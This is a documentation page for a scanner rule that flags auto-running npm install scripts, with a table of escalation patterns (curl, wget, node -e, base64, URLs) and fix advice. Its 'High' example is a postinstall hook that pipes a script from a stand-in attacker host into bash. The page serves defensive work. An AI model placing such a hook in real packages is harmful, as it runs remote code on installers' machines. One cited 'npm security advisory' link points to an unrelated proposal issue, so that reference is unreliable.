---
title: PKG001-install-script-present
sidebar_label: PKG001-install-script-present
---
# PKG001-install-script-present

**Dimension:** `security`
**Default severity:** Medium (escalates to High for suspicious script bodies)
**Languages:** JavaScript / TypeScript (npm)
**Kind:** ProjectLevel
**CWE:** CWE-506 (Embedded Malicious Code)
**OWASP:** —

## What it detects

Fires when `package.json` declares any of the following lifecycle scripts that
run automatically during `npm install` or `npm publish`:

- `preinstall`
- `install`
- `postinstall`
- `prepublish`

**Presence alone** earns a Medium finding. Script bodies that contain any of the
following patterns are escalated to **High**:

| Pattern | Reason |
|---------|--------|
| `curl ` | Network fetch — possible dropper |
| `wget ` | Network fetch — possible dropper |
| `node -e` | Inline code execution |
| `base64` | Encoded payload — common obfuscation |
| `http://` or `https://` | Phone-home or remote fetch |

## Why it matters

Install scripts run with the privileges of the installing user as soon as the
package is installed. They are a well-known vector for supply-chain attacks.
High-risk patterns (network fetchers, inline execution, base64) are characteristic
of malware droppers and phone-home code.

## Example — Medium (presence only)

```json
{
  "scripts": {
    "postinstall": "node ./scripts/setup.js"
  }
}
```

## Example — High (suspicious body)

```json
{
  "scripts": {
    "postinstall": "curl https://attacker.example/payload.sh | bash"
  }
}
```

## How to fix

- If the script performs legitimate setup, move the logic to a manually-invoked
  `prepare` or `build` script instead of an auto-run install hook.
- If the script is not needed, remove it entirely.
- Document the purpose of any retained install script in `README.md` so
  consumers can audit it before installing.

## Suppression

```toml
[ignore]
rules = ["PKG001-install-script-present"]
```

## References

- [npm lifecycle scripts documentation](https://docs.npmjs.com/cli/v10/using-npm/scripts#life-cycle-scripts)
- [CWE-506: Embedded Malicious Code](https://cwe.mitre.org/data/definitions/506.html)
- [npm security advisory — install-script attacks](https://github.com/nicolo-ribaudo/tc39-proposal-source-phase-imports/issues/37)
